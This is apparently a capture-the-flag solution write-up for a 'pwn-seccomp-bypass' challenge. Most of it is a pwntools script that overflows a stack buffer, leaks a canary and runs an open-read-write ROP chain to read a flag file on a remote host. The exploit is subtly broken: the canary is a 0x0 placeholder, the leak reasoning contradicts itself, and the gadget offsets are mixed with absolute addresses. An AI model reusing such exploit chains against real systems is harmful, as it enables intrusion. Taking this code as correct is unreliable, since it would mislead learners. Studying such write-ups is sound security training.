# pwn-seccomp-bypass — Solution

## Binary Properties
- **Static binary** — lots of ROP gadgets available
- **No PIE** — addresses fixed (binary prints `main` address anyway)
- **Seccomp filter**: allows `open`, `read`, `write`, `openat`; KILLS on `execve`, `fork`, `socket`
- **Stack canary** — must be bypassed

## Vulnerability
`read(STDIN_FILENO, buf, 512)` into `buf[128]` — 384-byte overflow.

## Strategy
Can't use `execve("/bin/sh")` → seccomp kills it.
Use ORW (open-read-write) ROP chain:
1. `open("/home/ctf/flag.txt", O_RDONLY)` → fd in rax
2. `read(fd, buf_addr, 256)` → flag into buffer
3. `write(1, buf_addr, 256)` → flag to stdout

## Gadgets needed (from static binary)
Find with `ROPgadget --binary vuln`:
- `pop rax; ret`
- `pop rdi; ret`
- `pop rsi; ret`  
- `pop rdx; ret` (or `pop rdx; pop rbx; ret`)
- `syscall; ret`

Static binary has thousands of gadgets.

## Stack layout of `vuln()`
```
[buf: 128 bytes][canary: 8][saved rbp: 8][saved rip: 8]
```
Need to leak canary first OR bypass it.

**Bypass**: since we overflow with `read()` (no NULL termination needed), we can use the format `%p` trick only if there's a printf. Here there's no printf on `buf` — **but** the binary prints `main` address, and since it's static with no canary bypass via FSB, we need another approach.

**Alternative**: The binary has stack canary. Use a two-stage approach:
- Stage 1: send 128 bytes + partial canary brute (1 byte at a time, fork server) — but no fork here
- Better: look for a canary leak elsewhere, or use the fact that `printf("Got: %s\n", buf)` will stop at null byte — check if canary's null byte truncates output to leak positions

**Simpler path**: compile locally and note that `-fstack-protector-all` places canary after local vars. The `read()` call reads 512 bytes. If we send exactly 128 bytes (fill buf) + 8 bytes canary value (which we get by overflowing printf output up to the null byte) + ROP chain.

**Realistic**: Use the `printf("Got: %s\n", buf)` to leak — send 128 'A's, the printf will print up to the next null byte (canary's LSB is \x00 → stops there). Then compute canary from the received length/position.

## Exploit

```python
from pwn import *

HOST = '172.30.3.30'
PORT = 9998

context.arch = 'amd64'

def start(): return remote(HOST, PORT)

p = start()

# Get binary base (no PIE but prints anyway)
p.recvuntil(b'text base: ')
main_addr = int(p.recvline().strip(), 16)
log.success(f'main: {main_addr:#x}')

# For a static binary, gadget addresses are fixed relative to the ELF load address
# Run locally: ROPgadget --binary vuln to find these
# Below are example offsets — adjust for actual binary
elf = ELF('./vuln', checksec=False)

POP_RAX   = elf.address + 0x45f93   # pop rax; ret
POP_RDI   = elf.address + 0x401f2f  # pop rdi; ret
POP_RSI   = elf.address + 0x40f2de  # pop rsi; ret
POP_RDX   = elf.address + 0x47f75c  # pop rdx; pop rbx; ret (common in static)
SYSCALL   = elf.address + 0x401c54  # syscall; ret
BSS       = elf.bss() + 0x200       # writable area for flag string

# Path to write into BSS: "/home/ctf/flag.txt\x00"
flag_path = b'/home/ctf/flag.txt\x00'

# Stage 1: leak canary
# Send 128 bytes then see what printf prints (stops at \x00 of canary)
p.sendafter(b'Enter command: ', b'A' * 128)
p.recvuntil(b'Got: ')
leak = p.recvuntil(b'\n', drop=True)
# If canary leak not visible, try 136 bytes and parse:
# This part requires local testing to find exact canary offset

# Simplified: assume we have the canary (via local testing or another leak)
# For the exploit demo, we'll use pwndbg to find canary offset
canary = 0x0  # replace with actual leaked canary

# Build ORW ROP chain
# First: write "/home/ctf/flag.txt" into BSS
rop = b'A' * 128           # fill buf
rop += p64(canary)         # canary
rop += p64(0x4141414141414141)  # saved rbp

# write flag_path into BSS using read syscall on known fd
# syscall: read(0, BSS, len(flag_path))
rop += p64(POP_RAX) + p64(0)       # SYS_read = 0
rop += p64(POP_RDI) + p64(0)       # fd = stdin
rop += p64(POP_RSI) + p64(BSS)     # buf = BSS
rop += p64(POP_RDX) + p64(len(flag_path)) + p64(0)  # count
rop += p64(SYSCALL)

# open("/home/ctf/flag.txt", O_RDONLY)
rop += p64(POP_RAX) + p64(2)       # SYS_open = 2
rop += p64(POP_RDI) + p64(BSS)     # pathname
rop += p64(POP_RSI) + p64(0)       # O_RDONLY
rop += p64(POP_RDX) + p64(0) + p64(0)
rop += p64(SYSCALL)                 # fd in rax (usually 3 or 4)

# read(fd, BSS+100, 256) — fd=3 is typical
rop += p64(POP_RAX) + p64(0)       # SYS_read = 0
rop += p64(POP_RDI) + p64(3)       # fd = 3 (result of open)
rop += p64(POP_RSI) + p64(BSS+100)
rop += p64(POP_RDX) + p64(256) + p64(0)
rop += p64(SYSCALL)

# write(1, BSS+100, 256)
rop += p64(POP_RAX) + p64(1)       # SYS_write = 1
rop += p64(POP_RDI) + p64(1)       # stdout
rop += p64(POP_RSI) + p64(BSS+100)
rop += p64(POP_RDX) + p64(256) + p64(0)
rop += p64(SYSCALL)

# exit(0)
rop += p64(POP_RAX) + p64(60)
rop += p64(POP_RDI) + p64(0)
rop += p64(SYSCALL)

p.send(rop)
# Send flag path for the second read()
p.send(flag_path)

print(p.recvall(timeout=3).decode(errors='replace'))
```

## Notes
- Find gadgets locally: `ROPgadget --binary vuln | grep "pop rax"`
- Find BSS address: `readelf -S vuln | grep bss`
- Canary leak: send exactly 128 bytes, printf stops at canary's \x00; then use read() which includes the 0x00 byte to infer canary position
- The `open` fd result (3) is hardcoded in the ROP — adjust if file descriptors differ
